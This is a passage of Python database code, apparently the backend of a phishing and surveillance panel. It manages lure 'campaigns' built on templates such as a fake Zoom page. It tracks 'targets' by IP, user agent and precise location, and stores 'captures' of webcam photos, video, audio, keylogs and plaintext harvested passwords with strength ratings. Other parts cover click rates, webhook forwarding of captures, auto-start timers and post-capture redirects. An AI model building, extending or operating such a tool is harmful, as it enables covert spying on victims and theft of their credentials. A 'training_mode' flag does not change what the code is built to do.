             active_seconds, last_active_start, paused_at)
            VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,0,0,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,0,?,?)""",
            (data["slug"], data.get("name", ""), data.get("template", "zoom"),
             status, data.get("note", ""),
             data.get("puburl", ""), data.get("screen_recording", 0),
             data.get("precise_location", 1), data.get("redirect_after_capture", 0),
             data.get("redirect_url", ""), data.get("lang", "en"),
             data.get("show_pretext", 0),
             json.dumps(data.get("permissions", ["camera","microphone","location","screen","keylogger"])),
             now, now, 1 if data.get("chat_mode", False) else 0,
             data.get("photo_quality", "480"),
             data.get("video_quality", "480"),
             data.get("liveview_quality", "low"),
             1 if data.get("auto_delete", False) else 0,
             data.get("auto_delete_seconds", 3600),
             1 if data.get("auto_start", False) else 0,
             data.get("auto_start_delay", 3600),
             1 if data.get("training_mode", False) else 0,
             1 if data.get("download_in_page", False) else 0,
             data.get("download_file_name", ""),
             data.get("download_display_name", ""),
             1 if data.get("audio_enabled", False) else 0,
              audio_files_json,
              1 if data.get("audio_save", False) else 0,
              1 if data.get("video_enabled", False) else 0,
              data.get("video_file", ""),
              1 if data.get("video_repeat", False) else 0,
              1 if data.get("video_save", False) else 0,
              last_active_start, ""))
        conn.commit()
        # handle global save if requested
        if data.get("audio_save") and data.get("audio_files"):
            set_global_default("default_audios", audio_files_json)
        if data.get("video_save") and data.get("video_file"):
            set_global_default("default_video", data.get("video_file", ""))
            set_global_default("default_video_repeat", "1" if data.get("video_repeat") else "0")
        row = conn.execute("SELECT * FROM campaigns WHERE slug=?", (slug,)).fetchone()
        return dict(row) if row else None
    return None

def get_all_campaigns():
    conn = get_db()
    rows = conn.execute("SELECT * FROM campaigns ORDER BY created_at DESC").fetchall()
    return [dict(r) for r in rows]

def update_campaign(slug, data):
    conn = get_db()
    # handle timer transition if status changing
    if "status" in data:
        old_row = conn.execute("SELECT status FROM campaigns WHERE slug=?", (slug,)).fetchone()
        old_status = old_row["status"] if old_row else ""
        new_status = data["status"]
        if old_status != new_status:
            update_campaign_active_timer(slug, old_status, new_status)
    fields = []
    vals = []
    for key in ("name", "status", "note", "puburl", "template",
                 "screen_recording", "precise_location",
                 "redirect_after_capture", "redirect_url", "lang",
                 "show_pretext", "chat_mode",
                 "photo_quality", "video_quality", "liveview_quality",
                 "auto_delete", "auto_delete_seconds",
                 "auto_start", "auto_start_delay",
                 "training_mode",
                 "download_in_page", "download_file_name",
                 "download_display_name",
                 "audio_enabled", "audio_files", "audio_save",
                 "video_enabled", "video_file", "video_repeat", "video_save"):
        if key in data:
            fields.append(f"{key}=?")
            # json encode audio_files if list
            if key == "audio_files" and isinstance(data[key], list):
                vals.append(json.dumps(data[key]))
            else:
                vals.append(data[key])
    if "permissions" in data:
        fields.append("permissions=?")
        vals.append(json.dumps(data["permissions"]))
    if fields:
        now = datetime.now().strftime("%H:%M:%S %d/%m/%y")
        fields.append("updated_at=?")
        vals.append(now)
        vals.append(slug)
        conn.execute(f"UPDATE campaigns SET {', '.join(fields)} WHERE slug=?", vals)
        conn.commit()
        # handle global save after update
        if data.get("audio_save"):
            af = data.get("audio_files")
            if af is not None:
                val = json.dumps(af) if isinstance(af, list) else str(af)
                set_global_default("default_audios", val)
        if data.get("video_save"):
            vf = data.get("video_file")
            if vf is not None:
                set_global_default("default_video", vf)
                vr = data.get("video_repeat", 0)
                set_global_default("default_video_repeat", "1" if vr else "0")
    row = conn.execute("SELECT * FROM campaigns WHERE slug=?", (slug,)).fetchone()
    return dict(row) if row else None

def delete_campaign(slug):
    conn = get_db()
    conn.execute("DELETE FROM campaigns WHERE slug=?", (slug,))
    conn.execute("DELETE FROM targets WHERE slug=?", (slug,))
    conn.execute("DELETE FROM captures WHERE slug=?", (slug,))
    conn.commit()
    dl_dir = os.path.join("downloads", slug)
    if os.path.exists(dl_dir):
        import shutil
        try:
            shutil.rmtree(dl_dir)
        except Exception:
            pass
    # clean campaign media
    for base in ("campaign_media", "campaign_audios", "campaign_videos"):
        cdir = os.path.join(base, slug)
        if os.path.exists(cdir):
            import shutil
            try:
                shutil.rmtree(cdir)
            except Exception:
                pass

def get_all_targets():
    conn = get_db()
    rows = conn.execute("SELECT * FROM targets ORDER BY connected_at DESC").fetchall()
    return [dict(r) for r in rows]

def save_target(t):
    conn = get_db()
    conn.execute("""INSERT OR REPLACE INTO targets
        (id, sid, alias, ip, user_agent, template, slug, campaign, status,
         connected_at, lat, lng, captures, last_seen, first_click_at, is_bot)
        VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)""",
        (t.get("id"), t.get("sid", ""), t.get("alias", ""),
         t.get("ip", ""), t.get("user_agent", ""), t.get("template", ""),
         t.get("slug", ""), t.get("campaign", ""), t.get("status", "waiting"),
         t.get("connected_at", datetime.now().strftime("%H:%M:%S")),
         t.get("lat"), t.get("lng"), t.get("captures", 0),
         t.get("last_seen"), t.get("first_click_at"), t.get("is_bot", 0)))
    conn.commit()

def delete_target(target_id):
    conn = get_db()
    conn.execute("DELETE FROM targets WHERE id=?", (target_id,))
    conn.commit()

def increment_campaign_hits(slug):
    conn = get_db()
    conn.execute("UPDATE campaigns SET hits=hits+1 WHERE slug=?", (slug,))
    conn.commit()

def increment_campaign_captures(slug):
    conn = get_db()
    conn.execute("UPDATE campaigns SET captures=captures+1 WHERE slug=?", (slug,))
    conn.commit()

def add_event(kind, detail, campaign="", target_id=""):
    conn = get_db()
    now = datetime.now().strftime("%H:%M:%S")
    conn.execute("INSERT INTO events (time, kind, detail, campaign, target_id) VALUES (?,?,?,?,?)",
                 (now, kind, detail, campaign, target_id))
    conn.commit()

def get_recent_events(limit=100):
    conn = get_db()
    rows = conn.execute("SELECT * FROM events ORDER BY id DESC LIMIT ?", (limit,)).fetchall()
    return [dict(r) for r in rows]

def get_all_captures():
    conn = get_db()
    rows = conn.execute("SELECT * FROM captures ORDER BY id DESC").fetchall()
    return [dict(r) for r in rows]

def save_capture(target_id, slug, cap_type, file_path="", metadata=None, password_text=""):
    conn = get_db()
    now = datetime.now().strftime("%H:%M:%S %d/%m/%y")
    strength = ""
    if password_text:
        strength = analyze_password_strength(password_text)
    conn.execute("""INSERT INTO captures
        (target_id, slug, type, file_path, metadata, password_text, password_strength, created_at)
        VALUES (?,?,?,?,?,?,?,?)""",
        (target_id, slug, cap_type, file_path,
         json.dumps(metadata or {}), password_text, strength, now))
    conn.commit()

def update_target_notes(target_id, notes):
    conn = get_db()
    conn.execute("UPDATE targets SET notes=? WHERE id=?", (notes, target_id))
    conn.commit()

def update_target_first_click(target_id):
    conn = get_db()
    t = conn.execute("SELECT first_click_at FROM targets WHERE id=?", (target_id,)).fetchone()
    if t and not t["first_click_at"]:
        now = datetime.now().strftime("%H:%M:%S %d/%m/%y")
        conn.execute("UPDATE targets SET first_click_at=? WHERE id=?", (now, target_id))
        conn.commit()

def analyze_password_strength(password):
    score = 0
    if len(password) >= 8: score += 1
    if len(password) >= 12: score += 1
    if re.search(r'[A-Z]', password): score += 1
    if re.search(r'[a-z]', password): score += 1
    if re.search(r'\d', password): score += 1
    if re.search(r'[^A-Za-z0-9]', password): score += 1
    if score <= 2: return "weak"
    if score <= 4: return "medium"
    return "strong"

def count_file_captures():
    counts = {"photos": 0, "videos": 0, "audio": 0, "keylogs": 0}
    uploads_dir = "uploads"
    if not os.path.exists(uploads_dir):
        return counts
    for folder in os.listdir(uploads_dir):
        fpath = os.path.join(uploads_dir, folder)
        if os.path.isdir(fpath):
            for fn in os.listdir(fpath):
                if fn.startswith("photo_"): counts["photos"] += 1
                elif fn.startswith("video_"): counts["videos"] += 1
                elif fn.startswith("audio_"): counts["audio"] += 1
                elif fn.startswith("keylog_"): counts["keylogs"] += 1
    return counts

def get_stats_summary():
    conn = get_db()
    total_campaigns = conn.execute("SELECT COUNT(*) FROM campaigns").fetchone()[0]
    total_targets = conn.execute("SELECT COUNT(*) FROM targets").fetchone()[0]
    active_targets = conn.execute("SELECT COUNT(*) FROM targets WHERE status='active'").fetchone()[0]
    total_captures = conn.execute("SELECT COUNT(*) FROM captures").fetchone()[0]
    total_hits = conn.execute("SELECT COALESCE(SUM(hits),0) FROM campaigns").fetchone()[0]
    total_submissions = conn.execute("SELECT COALESCE(SUM(submission_count),0) FROM campaigns").fetchone()[0]
    file_counts = count_file_captures()
    return {
        "campaigns": total_campaigns,
        "targets": total_targets,
        "active_targets": active_targets,
        "captures": total_captures,
        "hits": total_hits,
        "submissions": total_submissions,
        "photos": file_counts["photos"],
        "videos": file_counts["videos"],
        "audio": file_counts["audio"],
        "keylogs": file_counts["keylogs"],
    }

def get_webhook_configs():
    conn = get_db()
    rows = conn.execute("SELECT * FROM webhook_config ORDER BY id").fetchall()
    return [dict(r) for r in rows]

def save_webhook_config(data):
    conn = get_db()
    conn.execute("DELETE FROM webhook_config")
    for item in data:
        conn.execute("INSERT INTO webhook_config (platform, url, enabled, events) VALUES (?,?,?,?)",
                     (item.get("platform", ""), item.get("url", ""),
                      1 if item.get("enabled", False) else 0,
                      json.dumps(item.get("events", ["capture"]))))
    conn.commit()

def is_ip_banned(ip):
    conn = get_db()
    return conn.execute("SELECT 1 FROM banned_ips WHERE ip=?", (ip,)).fetchone() is not None

def ban_ip(ip, reason=""):
    conn = get_db()
    now = datetime.now().strftime("%H:%M:%S %d/%m/%y")
    conn.execute("INSERT OR IGNORE INTO banned_ips (ip, reason, banned_at) VALUES (?,?,?)", (ip, reason, now))
    conn.commit()

def unban_ip(ip):
    conn = get_db()
    conn.execute("DELETE FROM banned_ips WHERE ip=?", (ip,))
    conn.commit()

def get_banned_ips():
    conn = get_db()
    rows = conn.execute("SELECT * FROM banned_ips ORDER BY banned_at DESC").fetchall()
    return [dict(r) for r in rows]

def record_failed_login(ip):
    conn = get_db()
    now = datetime.now().strftime("%H:%M:%S %d/%m/%y")
    conn.execute("""
        INSERT INTO banned_ips (ip, reason, banned_at, attempts)
        VALUES (?, 'Failed login attempts', ?, 1)
        ON CONFLICT(ip) DO UPDATE SET attempts = attempts + 1
    """, (ip, now))
    conn.commit()
    row = conn.execute("SELECT attempts FROM banned_ips WHERE ip=?", (ip,)).fetchone()
    return row["attempts"] if row else 1

def get_template_stats(slug):
    conn = get_db()
    c = conn.execute("SELECT * FROM campaigns WHERE slug=?", (slug,)).fetchone()
    if not c:
        return None
    c = dict(c)
    target_count = conn.execute("SELECT COUNT(*) FROM targets WHERE slug=?", (slug,)).fetchone()[0]
    capture_count = conn.execute("SELECT COUNT(*) FROM captures WHERE slug=?", (slug,)).fetchone()[0]
    c["target_count"] = target_count
    c["capture_count"] = capture_count
    click_rate = 0
    if c["hits"] > 0:
        click_rate = round((c["captures"] / c["hits"]) * 100, 1)
    c["click_rate"] = click_rate
    return c

def log_panel_access(ip, user_agent="", path="", success=0):
    conn = get_db()
    now = datetime.now().strftime("%H:%M:%S %d/%m/%y")
    conn.execute("INSERT INTO panel_access_log (ip, user_agent, path, success, accessed_at) VALUES (?,?,?,?,?)",
                 (ip, user_agent, path, success, now))
    conn.commit()

def get_panel_access_log(limit=100):
    conn = get_db()
    rows = conn.execute("SELECT * FROM panel_access_log ORDER BY accessed_at DESC LIMIT ?", (limit,)).fetchall()
    return [dict(r) for r in rows]
